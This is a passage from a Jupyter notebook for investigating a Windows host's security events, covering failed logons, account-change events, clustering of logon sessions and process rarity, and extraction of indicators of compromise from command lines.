   "metadata": {
    "ExecuteTime": {
     "end_time": "2020-05-15T23:29:32.494051Z",
     "start_time": "2020-05-15T23:29:31.042487Z"
    }
   },
   "outputs": [],
   "source": [
    "failedLogons = qry_prov.WindowsSecurity.list_host_logon_failures(\n",
    "    logon_query_times, host_name=host_entity.HostName\n",
    ")\n",
    "if failedLogons.empty:\n",
    "    print(\"No logon failures recorded for this host between \",\n",
    "          f\" {logon_query_times.start} and {logon_query_times.end}\"\n",
    "        )\n",
    "else:\n",
    "    nbdisplay.display_timeline(\n",
    "        data=host_logons.query('TargetLogonId != \"0x3e7\"'),\n",
    "        overlay_data=failedLogons,\n",
    "        alert=related_alert,\n",
    "        title=\"Logons (blue=user-success, green=failed)\",\n",
    "        source_columns=tooltip_cols,\n",
    "        height=200,\n",
    "    )\n",
    "    display(failedLogons\n",
    " .astype({'LogonType': 'int32'})\n",
    " .merge(right=pd.Series(data=nbdisplay._WIN_LOGON_TYPE_MAP, name=\"LogonTypeDesc\"),\n",
    "               left_on=\"LogonType\", right_index=True)\n",
    " [['Account', 'EventID', 'TimeGenerated',\n",
    "  'Computer', 'SubjectUserName', 'SubjectDomainName',\n",
    "   'TargetUserName', 'TargetDomainName',\n",
    "   'LogonTypeDesc','IpAddress', 'WorkstationName'\n",
    "  ]])\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Accounts With Failed And Successful Logons\n",
    "This query joins failed and successful logons for the same account name. Multiple logon failures followed by a sucessful logon might indicate attempts to guess or probe the user password."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "ExecuteTime": {
     "end_time": "2020-05-15T23:29:35.995808Z",
     "start_time": "2020-05-15T23:29:35.834809Z"
    }
   },
   "outputs": [],
   "source": [
    "if not failedLogons.empty:\n",
    "    combined = pd.concat([failedLogons,\n",
    "                          host_logons[host_logons[\"TargetUserName\"]\n",
    "                                      .isin(failedLogons[\"TargetUserName\"]\n",
    "                                            .drop_duplicates())]])\n",
    "    display(combined.head())\n",
    "    combined[\"LogonStatus\"] = combined.apply(lambda x: \"Failed\" if x.EventID == 4625 else \"Success\", axis=1)\n",
    "    nbdisplay.display_timeline(data=combined,\n",
    "                               group_by=\"LogonStatus\",\n",
    "                               source_columns=[\"TargetUserName\", \"LogonType\", \"SubjectUserName\", \"TargetLogonId\"],\n",
    "                               legend=\"inline\",\n",
    "                               yaxis=True,\n",
    "                               height=200)\n",
    "    display(combined.sort_values(\"TimeGenerated\"))\n",
    "else:\n",
    "    md(f\"No logon failures recorded for this host between {logon_query_times.start} and {logon_query_times.end}\") "
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "[Contents](#Contents)\n",
    "# Other Security Events\n",
    " It's often useful to look at what other events were being logged\n",
    " at the time of the attack.\n",
    " \n",
    " We show events here grouped by Account. Things to look for are:\n",
    " \n",
    " - Unexpected events that change system security such as the addition of accounts or services\n",
    " - Event types that occur for only a single account - especially if there are a lot of event types only executed by a single account."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "ExecuteTime": {
     "end_time": "2020-05-15T23:29:47.340949Z",
     "start_time": "2020-05-15T23:29:38.308340Z"
    }
   },
   "outputs": [],
   "source": [
    "md(f\"Collecting Windows Event Logs for {host_entity.HostName}, this may take a few minutes...\")\n",
    "\n",
    "all_events_df = qry_prov.WindowsSecurity.list_host_events(\n",
    "    logon_query_times,\n",
    "    host_name=host_entity.HostName,\n",
    "    add_query_items=\"| where EventID != 4688 and EventID != 4624\",\n",
    ")\n",
    "\n",
    "# Create a pivot of Event vs. Account\n",
    "win_events_acc = all_events_df[[\"Account\", \"Activity\", \"TimeGenerated\"]].copy()\n",
    "win_events_acc = win_events_acc.replace(\"-\\\\-\", \"No Account\").replace(\n",
    "    {\"Account\": \"\"}, value=\"No Account\"\n",
    ")\n",
    "win_events_acc[\"Account\"] = win_events_acc.apply(lambda x: x.Account.split(\"\\\\\")[-1], axis=1)\n",
    "event_pivot = (\n",
    "    pd.pivot_table(\n",
    "        win_events_acc,\n",
    "        values=\"TimeGenerated\",\n",
    "        index=[\"Activity\"],\n",
    "        columns=[\"Account\"],\n",
    "        aggfunc=\"count\",\n",
    "    )\n",
    "    .fillna(0)\n",
    "    .reset_index()\n",
    ")\n",
    "display(Markdown(\"Yellow highlights indicate account with highest event count\"))\n",
    "(\n",
    "    event_pivot.style\n",
    "    .applymap(lambda x: \"color: white\" if x == 0 else \"\")\n",
    "    .applymap(\n",
    "        lambda x: \"background-color: lightblue\"\n",
    "        if not isinstance(x, str) and x > 0\n",
    "        else \"\"\n",
    "    )\n",
    "    .set_properties(subset=[\"Activity\"], **{\"width\": \"400px\", \"text-align\": \"left\"})\n",
    "    .highlight_max(axis=1)\n",
    "    .hide_index()\n",
    ")\n",
    "\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Parse Event Data for Selected Events\n",
    "For events that you want to look at in more detail you can parse out the full EventData field (containing all fields of the original event). The `parse_event_data` function below does that - transforming the EventData XML into a dictionary of property/value pairs). The `expand_event_properties` function takes this dictionary and transforms into columns in the output DataFrame.\n",
    "\n",
    "<br>\n",
    "&lt;details&gt;\n",
    "     <summary> <u>More details...</u></summary>\n",
    "You can do this for multiple event types in a single pass but, dependng on the schema of each event you may end up with a lot of sparsely populated columns. E.g. suppose EventID 1 has EventData fields A, B and C and EventID 2 has fields A, D, E. If you parse both IDs you'll will end up with a DataFrame with columns A, B, C, D and E with contents populated only for the rows that with corresponding data.\n",
    "\n",
    "We recommend that you process batches of related event types (e.g. all user account change events) that have similar sets of fields to keep the output DataFrame manageable.\n",
    "&lt;/details&gt;"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "ExecuteTime": {
     "end_time": "2020-05-15T23:29:58.968325Z",
     "start_time": "2020-05-15T23:29:58.080325Z"
    }
   },
   "outputs": [],
   "source": [
    "# Function to convert EventData XML into dictionary and\n",
    "# populate columns into DataFrame from previous query result\n",
    "import xml.etree.ElementTree as ET\n",
    "from xml.etree.ElementTree import ParseError\n",
    "\n",
    "SCHEMA = \"http://schemas.microsoft.com/win/2004/08/events/event\"\n",
    "\n",
    "\n",
    "def parse_event_data(row):\n",
    "    try:\n",
    "        xdoc = ET.fromstring(row.EventData)\n",
    "        col_dict = {\n",
    "            elem.attrib[\"Name\"]: elem.text for elem in xdoc.findall(f\"{{{SCHEMA}}}Data\")\n",
    "        }\n",
    "        reassigned = set()\n",
    "        for k, v in col_dict.items():\n",
    "            if k in row and not row[k]:\n",
    "                row[k] = v\n",
    "                reassigned.add(k)\n",
    "        if reassigned:\n",
    "            # print('Reassigned: ', ', '.join(reassigned))\n",
    "            for k in reassigned:\n",
    "                col_dict.pop(k)\n",
    "        return col_dict\n",
    "    except (ParseError, TypeError):\n",
    "        return None\n",
    "\n",
    "\n",
    "# Parse event properties into a dictionary\n",
    "all_events_df[\"EventProperties\"] = all_events_df.apply(parse_event_data, axis=1)\n",
    "\n",
    "# For a specific event ID you can explode the EventProperties values into their own columns\n",
    "# using this function. You can do this for the whole data set but it will result\n",
    "# in a lot of sparse columns in the output data frame\n",
    "def expand_event_properties(input_df):\n",
    "    exp_df = input_df.apply(lambda x: pd.Series(x.EventProperties), axis=1)\n",
    "    return (\n",
    "        exp_df.drop(set(input_df.columns).intersection(exp_df.columns), axis=1)\n",
    "        .merge(\n",
    "            input_df.drop(\"EventProperties\", axis=1),\n",
    "            how=\"inner\",\n",
    "            left_index=True,\n",
    "            right_index=True,\n",
    "        )\n",
    "        .replace(\"\", np.nan)  # these 3 lines get rid of blank columns\n",
    "        .dropna(axis=1, how=\"all\")\n",
    "        .fillna(\"\")\n",
    "    )\n",
    "\n",
    "\n",
    "expand_event_properties(all_events_df[all_events_df[\"EventID\"] == 4724]).head(2)\n",
    "\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Account Change Events - Timeline\n",
    "Here we want to focus on a some specific subcategories of events. Attackers commonly try to add or change user accounts and group memberships. We also include events related to addition or change of scheduled tasks and Windows services. "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "ExecuteTime": {
     "end_time": "2020-05-15T23:30:02.077311Z",
     "start_time": "2020-05-15T23:30:01.842315Z"
    }
   },
   "outputs": [],
   "source": [
    "# Get a full list of Windows Security Events\n",
    "import pkgutil\n",
    "import os\n",
    "w_evt = pkgutil.get_data(\"msticpy\", f\"resources{os.sep}WinSecurityEvent.json\")\n",
    "win_event_df = pd.read_json(w_evt)\n",
    "\n",
    "# Create criteria for events that we're interested in\n",
    "acct_sel = win_event_df[\"subcategory\"] == \"User Account Management\"\n",
    "group_sel = win_event_df[\"subcategory\"] == \"Security Group Management\"\n",
    "schtask_sel = (win_event_df[\"subcategory\"] == \"Other Object Access Events\") & (\n",
    "    win_event_df[\"description\"].str.contains(\"scheduled task\")\n",
    ")\n",
    "\n",
    "event_list = win_event_df[acct_sel | group_sel | schtask_sel][\"event_id\"].to_list()\n",
    "# Add Service install event\n",
    "event_list.append(7045)\n",
    "\n",
    "# Plot events on a timeline\n",
    "p = nbdisplay.display_timeline(\n",
    "    data=all_events_df[all_events_df[\"EventID\"].isin(event_list)],\n",
    "    group_by=\"EventID\",\n",
    "    source_columns=[\"Activity\", \"Account\"],\n",
    "    legend=\"right\",\n",
    ")"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Show Details of Selected Events\n",
    "From the above data - pick which event types you want to view (by default, all are selected).\n",
    "The second cell will display the event types selected."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "ExecuteTime": {
     "end_time": "2019-11-01T19:38:42.155265Z",
     "start_time": "2019-11-01T19:38:42.104295Z"
    }
   },
   "outputs": [],
   "source": [
    "# populate actual events IDs to select from\n",
    "recorded_events = (all_events_df['EventID']\n",
    "                   [all_events_df[\"EventID\"]\n",
    "                    .isin(event_list)].drop_duplicates().values)\n",
    "event_subset = win_event_df[win_event_df[\"event_id\"].isin(event_list)\n",
    "                            & win_event_df[\"event_id\"].isin(recorded_events)]\n",
    "items = list(event_subset.apply(lambda x: (x.full_desc, x.event_id), axis=1).values)\n",
    "ss = nbwidgets.SelectSubset(\n",
    "    items,\n",
    "    default_selected=items\n",
    ")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "ExecuteTime": {
     "end_time": "2019-11-01T19:38:48.430726Z",
     "start_time": "2019-11-01T19:38:48.412764Z"
    }
   },
   "outputs": [],
   "source": [
    "col_names = ['TimeGenerated', 'Account', 'AccountType',\n",
    "             'Computer', 'EventID', 'Activity', 'SubjectAccount',\n",
    "             'SubjectDomainName', 'SubjectLogonId', 'SubjectUserName',\n",
    "             'TargetAccount', 'TargetDomainName', 'TargetSid', 'TargetUserName']\n",
    "display(all_events_df[all_events_df[\"EventID\"].isin(ss.selected_values)]\n",
    " [col_names]\n",
    " .replace(to_replace=\"\", value=np.NAN)\n",
    " .dropna(axis=1, how=\"all\"))\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "[Contents](#Contents)\n",
    "# Examine Logon Sessions\n",
    "Looking at characteristics and activity of individual logon sessions is an effective way of spottting clusters of attacker activity.\n",
    "\n",
    "The biggest problem is deciding which logon sessions are the ones to look at. We may already have some indicators of sessions that we want to examine from earlier sections:\n",
    "\n",
    "- Accounts that experienced a series of failed logons followed by successful logons [see](#Accounts With Failed And Successful Logons)\n",
    "- Accounts that triggered unexpected events [see](#Show-Timeline-of-Account-Change-Events)\n",
    "\n",
    "In this section we use clustering to collapse repetive logons and show details of the distinct logon patterns\n",
    "\n",
    " ## Browse logon account details"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "ExecuteTime": {
     "end_time": "2020-05-15T23:30:15.514844Z",
     "start_time": "2020-05-15T23:30:14.697818Z"
    }
   },
   "outputs": [],
   "source": [
    "from msticpy.sectools.eventcluster import (\n",
    "    dbcluster_events,\n",
    "    add_process_features,\n",
    "    _string_score,\n",
    ")\n",
    "\n",
    "if host_logons is None or host_logons.empty:\n",
    "    display(Markdown(\"No host logons recorded. This section cannot be run.\"))\n",
    "    raise ValueError(\"aborted\")\n",
    "\n",
    "# Set up clustering features and run DBScan clustering\n",
    "logon_features = host_logons.copy()\n",
    "logon_features[\"AccountNum\"] = host_logons.apply(\n",
    "    lambda x: _string_score(x.Account), axis=1\n",
    ")\n",
    "logon_features[\"TargetUserNum\"] = host_logons.apply(\n",
    "    lambda x: _string_score(x.TargetUserName), axis=1\n",
    ")\n",
    "logon_features[\"LogonHour\"] = host_logons.apply(lambda x: x.TimeGenerated.hour, axis=1)\n",
    "\n",
    "# you might need to play around with the max_cluster_distance parameter.\n",
    "# decreasing this gives more clusters.\n",
    "(clus_logons, _, _) = dbcluster_events(\n",
    "    data=logon_features,\n",
    "    time_column=\"TimeGenerated\",\n",
    "    cluster_columns=[\"AccountNum\", \"LogonType\", \"TargetUserNum\"],\n",
    "    max_cluster_distance=0.0001,\n",
    ")\n",
    "display(Markdown(f\"Number of input events: {len(host_logons)}\"))\n",
    "display(Markdown(f\"Number of clustered events: {len(clus_logons)}\"))\n",
    "\n",
    "display(Markdown(\"### Relative frequencies by account pattern\"))\n",
    "plt.rcParams[\"figure.figsize\"] = (12, 4)\n",
    "clus_logons.sort_values(\"Account\").plot.barh(x=\"Account\", y=\"ClusterSize\");\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    " ## View distinct host logon patterns"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "ExecuteTime": {
     "end_time": "2020-05-15T23:30:17.480349Z",
     "start_time": "2020-05-15T23:30:17.426340Z"
    }
   },
   "outputs": [],
   "source": [
    "import re\n",
    "\n",
    "# Build a list of distinct logon patterns from the clustered data\n",
    "dist_logons = clus_logons.sort_values(\"TimeGenerated\")[\n",
    "    [\"TargetUserName\", \"TimeGenerated\", \"LastEventTime\", \"LogonType\", \"ClusterSize\"]\n",
    "]\n",
    "dist_logons = dist_logons.apply(\n",
    "    lambda x: (\n",
    "        f\"{x.TargetUserName}:    \"\n",
    "        f\"(logontype {x.LogonType})   \"\n",
    "        f\"timerange: {x.TimeGenerated} - {x.LastEventTime}    \"\n",
    "        f\"count: {x.ClusterSize}\"\n",
    "    ),\n",
    "    axis=1,\n",
    ")\n",
    "# Convert to dict, flipping keys/values\n",
    "dist_logons = {v: k for k, v in dist_logons.to_dict().items()}\n",
    "\n",
    "\n",
    "def get_selected_logon_cluster(selected_item):\n",
    "    acct = clus_logons.loc[selected_item][\"TargetUserName\"]\n",
    "    logon_type = clus_logons.loc[selected_item][\"LogonType\"]\n",
    "    return host_logons.query(\"TargetUserName == @acct and LogonType == @logon_type\")\n",
    "\n",
    "\n",
    "# Create an Output widget to show the Logon Details\n",
    "w_output = widgets.Output(layout={\"border\": \"1px solid black\"})\n",
    "\n",
    "\n",
    "def show_logon(idx):\n",
    "    w_output.clear_output()\n",
    "    with w_output:\n",
    "        nbdisplay.display_logon_data(pd.DataFrame(clus_logons.loc[idx]).T)\n",
    "\n",
    "\n",
    "logon_wgt = nbwidgets.SelectString(\n",
    "    description=\"Select logon cluster to examine\",\n",
    "    item_dict=dist_logons,\n",
    "    action=show_logon,\n",
    "    height=\"200px\",\n",
    "    width=\"100%\",\n",
    "    auto_display=True,\n",
    ")\n",
    "display(w_output)\n",
    "# Display the first item on first view\n",
    "top_item = next(iter(dist_logons.values()))\n",
    "with w_output:\n",
    "    nbdisplay.display_logon_data(pd.DataFrame(clus_logons.loc[top_item]).T)\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    " ## Analyze Processes Patterns for logon sessions\n",
    " \n",
    "In this section we look at the types of processes run in each logon session. For each process (and process characteristics such as command line structure) we measure its rarity compared to other processes on the same host. We then calculate the mean rarity of all processes in a logon session and display the results ordered by rarity. One is the highest possible score and would indicate all processes in the session have a unique execution pattern.\n",
    " \n",
    "Note: The next section retrieves processes for time period around the logons for the user ID selected in the previous session. If you want to view a broader time boundary please adjust the query time boundaries in below."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "ExecuteTime": {
     "end_time": "2020-05-15T23:30:31.264572Z",
     "start_time": "2020-05-15T23:30:31.213572Z"
    }
   },
   "outputs": [],
   "source": [
    "# set the origin time to start at the first logon in our set\n",
    "# end end 2hrs after the last\n",
    "start_time = host_logons[\"TimeGenerated\"].min()\n",
    "end_time = host_logons[\"TimeGenerated\"].max()\n",
    "time_diff = int((end_time - start_time).total_seconds() / (60 * 60) + 2)\n",
    "proc_query_times = nbwidgets.QueryTime(\n",
    "    units=\"hours\",\n",
    "    origin_time=start_time,\n",
    "    before=1,\n",
    "    after=time_diff + 1,\n",
    "    max_before=20,\n",
    "    max_after=time_diff + 20,\n",
    ")\n",
    "proc_query_times.display()\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    " ### Compute the relative rarity of processes in each session\n",
    " This should be a good guide to which sessions are the more interesting to look at.\n",
    " \n",
    " **Note** Clustering lots (1000s) of events will take a little time to compute."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "ExecuteTime": {
     "end_time": "2020-05-15T23:30:56.847458Z",
     "start_time": "2020-05-15T23:30:36.409635Z"
    }
   },
   "outputs": [],
   "source": [
    "from msticpy.sectools.eventcluster import dbcluster_events, add_process_features\n",
    "from collections import Counter\n",
    "\n",
    "print(\"Getting process events...\", end=\"\")\n",
    "processes_on_host = qry_prov.WindowsSecurity.list_host_processes(\n",
    "    proc_query_times, host_name=host_entity.HostName\n",
    ")\n",
    "print(f\"done. {len(processes_on_host)} events\")\n",
    "print(\"Clustering. Please wait...\", end=\"\")\n",
    "feature_procs = add_process_features(input_frame=processes_on_host, path_separator=\"\\\\\")\n",
    "\n",
    "feature_procs[\"accountNum\"] = feature_procs.apply(\n",
    "    lambda x: _string_score(x.Account), axis=1\n",
    ")\n",
    "# you might need to play around with the max_cluster_distance parameter.\n",
    "# decreasing this gives more clusters.\n",
    "(clus_events, dbcluster, x_data) = dbcluster_events(\n",
    "    data=feature_procs,\n",
    "    cluster_columns=[\n",
    "        \"commandlineTokensFull\",\n",
    "        \"pathScore\",\n",
    "        \"accountNum\",\n",
    "        \"isSystemSession\",\n",
    "    ],\n",
    "    max_cluster_distance=0.0001,\n",
    ")\n",
    "print(\"done\")\n",
    "print(\"Number of input events:\", len(feature_procs))\n",
    "print(\"Number of clustered events:\", len(clus_events))\n",
    "\n",
    "# Join the clustered results back to the original process frame\n",
    "procs_with_cluster = feature_procs.merge(\n",
    "    clus_events[\n",
    "        [\n",
    "            \"commandlineTokensFull\",\n",
    "            \"accountNum\",\n",
    "            \"pathScore\",\n",
    "            \"isSystemSession\",\n",
    "            \"ClusterSize\",\n",
    "        ]\n",
    "    ],\n",
    "    on=[\"commandlineTokensFull\", \"accountNum\", \"pathScore\", \"isSystemSession\"],\n",
    ")\n",
    "# Rarity = inverse of cluster size\n",
    "procs_with_cluster[\"Rarity\"] = 1 / procs_with_cluster[\"ClusterSize\"]\n",
    "# count the number of processes for each logon ID\n",
    "lgn_proc_count = (\n",
    "    pd.concat(\n",
    "        [\n",
    "            processes_on_host.groupby(\"TargetLogonId\")[\"TargetLogonId\"].count(),\n",
    "            processes_on_host.groupby(\"SubjectLogonId\")[\"SubjectLogonId\"].count(),\n",
    "        ]\n",
    "    ).sum(level=0)\n",
    ").to_dict()\n",
    "\n",
    "# Display the results\n",
    "md(\"Sessions ordered by process rarity\", 'bold')\n",
    "md(\"Higher score indicates higher number of unusual processes\")\n",
    "process_rarity = (procs_with_cluster.groupby([\"SubjectUserName\", \"SubjectLogonId\"])\n",
    "    .agg({\"Rarity\": \"mean\", \"TimeGenerated\": \"count\"})\n",
    "    .rename(columns={\"TimeGenerated\": \"ProcessCount\"})\n",
    "    .reset_index())\n",
    "display(\n",
    "    process_rarity\n",
    "    .sort_values(\"Rarity\", ascending=False)\n",
    "    .style.bar(subset=[\"Rarity\"], color=\"#d65f5f\")\n",
    ")\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Overview of session timelines for sessions with higher rarity score"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "ExecuteTime": {
     "end_time": "2020-05-15T23:31:02.979872Z",
     "start_time": "2020-05-15T23:31:02.675871Z"
    }
   },
   "outputs": [],
   "source": [
    "# Display process timeline for 75% percentile rarest scores\n",
    "rare_sess = process_rarity[process_rarity[\"Rarity\"]\n",
    "                           > process_rarity[\"Rarity\"].quantile(.25)]\n",
    "rare_sessions = processes_on_host[(processes_on_host[\"SubjectLogonId\"]\n",
    "                                   .isin(rare_sess[\"SubjectLogonId\"]))\n",
    "                                  & (processes_on_host[\"SubjectUserName\"]\n",
    "                                     .isin(rare_sess[\"SubjectUserName\"]))]\n",
    "\n",
    "md(\"Timeline of sessions with higher process rarity\", \"large\")\n",
    "md(\"Multiple sessions (y-axis) may be are shown for each account.\")\n",
    "md(\"You will likely need to zoom in to see the individual session processes.\")\n",
    "\n",
    "nbdisplay.display_timeline(\n",
    "    data=rare_sessions,\n",
    "    group_by=\"SubjectLogonId\",\n",
    "    source_columns=[\"SubjectUserName\", \"SubjectLogonId\", \"NewProcessName\", \"CommandLine\"],\n",
    "    legend=\"right\",\n",
    "    yaxis=True\n",
    ");"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### View the processes for these Sessions"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "ExecuteTime": {
     "end_time": "2020-05-15T23:31:09.344452Z",
     "start_time": "2020-05-15T23:31:09.280062Z"
    }
   },
   "outputs": [],
   "source": [
    "def view_logon_sess(logon_id=\"\"):\n",
    "    global selected_logon\n",
    "    selected_logon = host_logons[host_logons[\"TargetLogonId\"] == logon_id]\n",
    "\n",
    "    if all_procs.value:\n",
    "        sess_procs = processes_on_host.query(\n",
    "            \"TargetLogonId == @logon_id | SubjectLogonId == @logon_id\"\n",
    "        )\n",
    "    else:\n",
    "        sess_procs = procs_with_cluster.query(\"SubjectLogonId == @logon_id\")[\n",
    "            [\"NewProcessName\", \"CommandLine\", \"SubjectLogonId\", \"ClusterSize\"]\n",
    "        ].drop_duplicates()\n",
    "    display(sess_procs)\n",
    "\n",
    "sessions = list(process_rarity\n",
    "                .sort_values(\"Rarity\", ascending=False)\n",
    "                .apply(lambda x: (f\"{x.SubjectLogonId}  {x.SubjectUserName}   Rarity={x.Rarity}\",\n",
    "                                  x.SubjectLogonId), \n",
    "                       axis=1))\n",
    "all_procs = widgets.Checkbox(\n",
    "    value=False,\n",
    "    description=\"View All Processes (Show clustered only if not checked)\",\n",
    "    **WIDGET_DEFAULTS,\n",
    ")\n",
    "display(all_procs)\n",
    "logon_wgt = nbwidgets.SelectString(\n",
    "    description=\"Select logon session to examine\",\n",
    "    item_dict={label: val for label, val in sessions},\n",
    "    height=\"300px\",\n",
    "    width=\"100%\",\n",
    "    auto_display=True,\n",
    "    action=view_logon_sess,\n",
    ")\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Browse All Sessions (Optional)\n",
    "\n",
    "**If the previous section did not reveal anything interesting you can opt to browse all logon sessions.**\n",
    "\n",
    "**Otherwise, skip to the [Check Commandline for IoCs section](#Check-for-IOCs-in-Commandline-for-selected-session)**\n",
    "\n",
    "To do this you need to first pick an account + logon type (in the following cell) then pick a particular session that you want to view in the subsequent cell. Use the rarity score from the previous graph to guide you.\n",
    "\n",
    " ### Step 1 - Select a logon ID and Type"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "ExecuteTime": {
     "end_time": "2019-10-19T01:18:41.70951Z",
     "start_time": "2019-10-19T01:18:41.686523Z"
    }
   },
   "outputs": [],
   "source": [
    "logon_wgt2 = nbwidgets.SelectString(\n",
    "    description=\"Select logon cluster to examine\",\n",
    "    item_dict=dist_logons,\n",
    "    height=\"200px\",\n",
    "    width=\"100%\",\n",
    "    auto_display=True,\n",
    ")\n",
    "all_procs = widgets.Checkbox(\n",
    "    value=False,\n",
    "    description=\"View All Processes (Clustered only if not checked)\",\n",
    "    **WIDGET_DEFAULTS,\n",
    ")\n",
    "display(all_procs)\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    " ### Step 2 - Pick a logon session to view its processes"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "ExecuteTime": {
     "end_time": "2019-10-19T01:18:55.502417Z",
     "start_time": "2019-10-19T01:18:55.450467Z"
    }
   },
   "outputs": [],
   "source": [
    "selected_logon_cluster = get_selected_logon_cluster(logon_wgt2.value)\n",
    "\n",
    "selected_tgt_logon = selected_logon_cluster[\"TargetUserName\"].iat[0]\n",
    "system_logon = selected_tgt_logon.lower() == \"system\" or selected_tgt_logon.endswith(\n",
    "    \"$\"\n",
    ")\n",
    "\n",
    "if system_logon:\n",
    "    display(\n",
    "        Markdown(\n",
    "            '<h3><p style=\"color:red\">Warning: the selected '\n",
    "            \"account name appears to be a system account.</p></h1><br>\"\n",
    "            \"<i>It is difficult to accurately associate processes \"\n",
    "            \"with the specific logon sessions.<br>\"\n",
    "            \"Showing clustered events for entire time selection.\"\n",
    "        )\n",
    "    )\n",
    "    display(\n",
    "        clus_events.sort_values(\"TimeGenerated\")[\n",
    "            [\n",
    "                \"TimeGenerated\",\n",
    "                \"LastEventTime\",\n",
    "                \"NewProcessName\",\n",
    "                \"CommandLine\",\n",
    "                \"ClusterSize\",\n",
    "                \"commandlineTokensFull\",\n",
    "                \"pathScore\",\n",
    "                \"isSystemSession\",\n",
    "            ]\n",
    "        ]\n",
    "    )\n",
    "\n",
    "# Display a pick list for logon instances\n",
    "sel_1 = host_logons[\"TargetLogonId\"].isin(lgn_proc_count)\n",
    "sel_2 = host_logons[\"TargetUserName\"] == selected_tgt_logon\n",
    "items = (\n",
    "    host_logons[sel_1 & sel_2]\n",
    "    .sort_values(\"TimeGenerated\")\n",
    "    .apply(\n",
    "        lambda x: (\n",
    "            f\"{x.TargetUserName}:    \"\n",
    "            f\"(logontype={x.LogonType})   \"\n",
    "            f\"(timestamp={x.TimeGenerated})    \"\n",
    "            f\"logonid={x.TargetLogonId}\"\n",
    "        ),\n",
    "        axis=1,\n",
    "    )\n",
    "    .values.tolist()\n",
    ")\n",
    "if not items:\n",
    "    items = [\"No processes for logon\"]\n",
    "sess_w = widgets.Select(\n",
    "    options=items, description=\"Select logon instance to examine\", **WIDGET_DEFAULTS\n",
    ")\n",
    "\n",
    "import re\n",
    "\n",
    "logon_list_regex = r\"\"\"\n",
    "(?P<acct>[^:]+):\\s+\n",
    "\\(logontype=(?P<logon_type>[^)]+)\\)\\s+\n",
    "\\(timestamp=(?P<time>[^)]+)\\)\\s+\n",
    "logonid=(?P<logonid>[0-9a-fx)]+)\n",
    "\"\"\"\n",
    "\n",
    "\n",
    "def get_selected_logon(selected_item):\n",
    "    acct_match = re.search(logon_list_regex, selected_item, re.VERBOSE)\n",
    "    if acct_match:\n",
    "        acct = acct_match[\"acct\"]\n",
    "        logon_type = int(acct_match[\"logon_type\"])\n",
    "        time_stamp = pd.to_datetime(acct_match[\"time\"])\n",
    "        logon_id = acct_match[\"logonid\"]\n",
    "        return host_logons.query(\n",
    "            \"TargetUserName == @acct and LogonType == @logon_type\"\n",
    "            \" and TargetLogonId == @logon_id\"\n",
    "        )\n",
    "\n",
    "\n",
    "def view_logon_sess(x=\"\"):\n",
    "    global selected_logon\n",
    "    selected_logon = get_selected_logon(x)\n",
    "    if selected_logon is not None:\n",
    "        logonId = selected_logon[\"TargetLogonId\"].iloc[0]\n",
    "        if all_procs.value:\n",
    "            sess_procs = processes_on_host.query(\n",
    "                \"TargetLogonId == @logonId | SubjectLogonId == @logonId\"\n",
    "            )\n",
    "        else:\n",
    "            sess_procs = procs_with_cluster.query(\"SubjectLogonId == @logonId\")[\n",
    "                [\"NewProcessName\", \"CommandLine\", \"SubjectLogonId\", \"ClusterSize\"]\n",
    "            ].drop_duplicates()\n",
    "        display(sess_procs)\n",
    "\n",
    "\n",
    "widgets.interactive(view_logon_sess, x=sess_w)\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    " <a></a>[Contents](#toc)\n",
    " # Check for IOCs in Commandline for selected session\n",
    " This section looks for Indicators of Compromise (IoC) within the data sets passed to it.\n",
    " \n",
    " The input data for this comes from the session you picked in the following sections:\n",
    " - [Compute the relative rarity of processes in each session](#View-the-processes-for-these-Sessions)\n",
    " - [Browse All Sessions](#Step-2---Pick-a-logon-session-to-view-its-processes)\n",
    " \n",
    "To change which section is used - go back to the desired section and pick a session or re-run the entire cell.\n",
    "\n",
    "## Extract IoCs"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "ExecuteTime": {
     "end_time": "2019-09-12T22:34:30.885408Z",
     "start_time": "2019-09-12T22:34:30.882411Z"
    }
   },
   "outputs": [],
   "source": [
    "# Use this to search all process commandlines\n",
    "# ioc_df = ioc_extractor.extract(\n",
    "#     data=procs_with_cluster,\n",
    "#     columns=[\"CommandLine\"],\n",
    "#     os_family=os_family,\n",
    "#     ioc_types=[\"ipv4\", \"ipv6\", \"dns\", \"url\", \"md5_hash\", \"sha1_hash\", \"sha256_hash\"],\n",
    "# )\n",
    "# ioc_df[[\"IoCType\", \"Observable\"]].drop_duplicates()"
   ]
